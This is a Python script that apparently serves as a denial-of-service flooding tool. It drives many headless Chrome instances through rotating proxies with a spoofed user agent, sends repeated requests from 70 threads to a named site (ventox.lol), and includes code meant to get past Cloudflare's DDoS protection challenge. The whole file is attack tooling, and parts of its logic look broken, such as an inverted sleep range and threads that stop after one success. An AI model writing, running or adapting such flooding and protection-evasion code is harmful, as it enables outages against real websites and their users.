import time
import threading
import random
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# Read in the list of proxies from a text file
with open('proxy.txt') as f:
    proxies = f.read().splitlines()

# Set the custom user agent to use
user_agent = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"

# Set the target URL to request
target_url = "https://ventox.lol"

# Set the number of requests to send per second
requests_per_second = 50

# Set the number of seconds to run the script
run_time_seconds = 60

# Set the number of threads to use
num_threads = 70

# Define a function to send requests with Selenium and bypass Cloudflare
def send_request(proxy):
    # Create a ChromeDriver instance with Selenium
    chrome_options = Options()
    chrome_options.add_argument('--disable-extensions')
    chrome_options.add_argument('--headless')
    chrome_options.add_argument('--disable-gpu')
    chrome_options.add_argument('--no-sandbox')
    chrome_options.add_argument('--disable-dev-shm-usage')
    chrome_options.add_argument(f'user-agent={user_agent}')
    chrome_options.add_argument('--proxy-server=%s' % proxy)
    driver = webdriver.Chrome(options=chrome_options)

    # Send the request to the target URL
    driver.get(target_url)

    # Check if the page is protected by Cloudflare
    if "DDoS protection by Cloudflare" in driver.title:
        # Wait for the JavaScript challenge page to appear
        wait = WebDriverWait(driver, 30)
        wait.until(EC.presence_of_element_located((By.ID, "challenge-form")))

        # Solve the challenge by waiting for a random amount of time
        time.sleep(random.uniform(2, 5))

        # Submit the challenge form
        form = driver.find_element_by_id("challenge-form")
        form.submit()

        # Wait until the "challenge-running" element disappears
        wait.until_not(EC.presence_of_element_located((By.ID, "challenge-running")))

    # Get the page source and quit the ChromeDriver instance
    page_source = driver.page_source
    driver.quit()

    return page_source

# Define a function to send multiple requests per second with a random proxy
def send_requests():
    while True:
        proxy = random.choice(proxies)
        try:
            page_source = send_request(proxy)
            print("Success with proxy:", proxy)
            break
        except:
            print("Failed with proxy:", proxy)

    # Wait for a random amount of time before sending the next request
    time.sleep(random.uniform(1/requests_per_second, 1/(2*requests_per_second)))

# Start the loop to send requests
start_time = time.time()
threads = []
for i in range(num_threads):
    thread = threading.Thread(target=send_requests)
    thread.start()
    threads.append(thread)
for thread in threads:
    thread.join()
while time.time() - start_time < run_time_seconds:
    send_requests()

print("Done sending requests.")